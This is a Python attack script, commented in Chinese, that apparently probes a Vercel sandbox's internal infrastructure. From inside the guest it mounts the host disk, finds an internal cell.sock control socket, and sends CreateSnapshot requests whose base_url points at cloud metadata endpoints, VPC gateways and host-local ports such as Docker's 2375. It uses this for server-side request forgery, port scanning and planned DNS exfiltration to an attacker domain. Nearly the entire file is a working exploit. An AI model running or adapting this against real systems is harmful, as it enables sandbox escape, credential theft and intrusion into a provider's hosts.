# -*- coding: utf-8 -*-
"""vda46_s3_ssrf: CreateSnapshot base_url 攻击面 (drive_id 命中后执行)
前置: vda44 命中有效 drive_id -> /vercel/sandbox/hit_drive_id.txt
目标:
  1) 验证 fetch 执行层: guest 内监听端口 (127.0.0.1) + host 侧行为差异
  2) SSRF 变体: IMDS 169.254.169.254 / 169.254.170.2 / VPC DNS 172.31.0.2 / 内网网关
  3) DNS 外带: s3://<unique>.attacker-domain/ 观测 host 是否解析 (若配置了可观测域)
  4) 127.0.0.1 端口扫描 host 本地服务 (若 fetch 在 host 执行, 错误差异即 oracle)
输出落盘 + 哨兵 V46D_DONE"""
import os, time, socket, ctypes, threading

OUT = '/vercel/sandbox/v46d.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=6):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    if not os.path.exists(sp):
        log('cell.sock MISSING -> abort')
        f.close()
        return
    PATH = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'

    # P0: 读取命中 drive_id
    did = ''
    for p in ['/vercel/sandbox/hit_drive_id.txt', '/mnt/vdax/vercel/sandbox/hit_drive_id.txt']:
        try:
            did = open(p).read().strip()
            break
        except Exception:
            continue
    if not did:
        log('NO hit_drive_id -> fallback cell_id probe only')
        try:
            cl = open('/proc/cmdline').read()
            import re
            m = re.search(r'cell_id=(\S+)', cl)
            if m:
                did = m.group(1)
        except Exception:
            pass
    log('drive_id = %s' % did)

    # P1: 执行层验证 (guest 监听 18080, 看 base_url=127.0.0.1 是否回连)
    log('=== P1 exec-layer check ===')
    hits = []
    done = threading.Event()
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(('0.0.0.0', 18080))
        srv.listen(8)
        srv.settimeout(20)
    except Exception as e:
        log('bind ERR %s' % e)
    for url in ['s3://127.0.0.1:18080/b/k', 's3://127.0.0.1:18080/test.bin',
                's3://localhost:18080/b/k', 's3://0.0.0.0:18080/b/k']:
        body = '{"drive_id":"%s","base_url":"%s"}' % (did, url)
        t0 = time.time()
        st, bd = rpc_unix(sp, PATH, body, t=8)
        log('layer %-38s -> %s (%.2fs) | %s' % (url, st, time.time() - t0, bd[:200].replace('\n', ' ')))
    try:
        while True:
            c, addr = srv.accept()
            c.settimeout(3)
            try:
                data = c.recv(8192)
                hits.append((addr, data[:300]))
                log('*** GUEST-LOCAL CONN: %s %r' % (addr, data[:300]))
            except Exception:
                hits.append((addr, b''))
                log('*** GUEST-LOCAL CONN: %s (no data)' % (addr,))
            c.close()
    except socket.timeout:
        pass
    srv.close()
    log('local conns: %d' % len(hits))

    # P2: SSRF 变体 (IMDS / VPC 内网 / host 本地)
    log('=== P2 SSRF variants ===')
    targets = ['s3://169.254.169.254/b/k',
               's3://169.254.169.254/latest/meta-data/b/k',
               's3://169.254.170.2/b/k',
               's3://172.31.0.2/b/k',
               's3://172.31.0.1/b/k',
               's3://100.64.0.1/b/k',
               's3://127.0.0.1:443/b/k',
               's3://127.0.0.1:8080/b/k',
               's3://127.0.0.1:2375/b/k',
               's3://127.0.0.1:18080/b/k',
               's3://bucket.s3.amazonaws.com/key',
               's3://%s/b/k' % did]
    for url in targets:
        body = '{"drive_id":"%s","base_url":"%s"}' % (did, url)
        t0 = time.time()
        st, bd = rpc_unix(sp, PATH, body, t=6)
        log('ssrf %-45s -> %s (%.2fs) | %s' % (url, st, time.time() - t0, bd[:200].replace('\n', ' ')))
        time.sleep(0.4)

    # P3: 空/畸形 base_url (解析行为指纹)
    log('=== P3 malformed base_url ===')
    for url in ['s3://', 's3:///b/k', 's3://a', 's3://a/b', 's3://..', 'http://169.254.169.254/',
                'https://169.254.169.254/', 'ftp://127.0.0.1/', '', 's3://127.0.0.1:1/%s' % did]:
        body = '{"drive_id":"%s","base_url":"%s"}' % (did, url)
        t0 = time.time()
        st, bd = rpc_unix(sp, PATH, body, t=5)
        log('mal %-45s -> %s (%.2fs) | %s' % (url, st, time.time() - t0, bd[:200].replace('\n', ' ')))
        time.sleep(0.3)

    log('V46D_DONE')
    f.close()


if __name__ == '__main__':
    main()
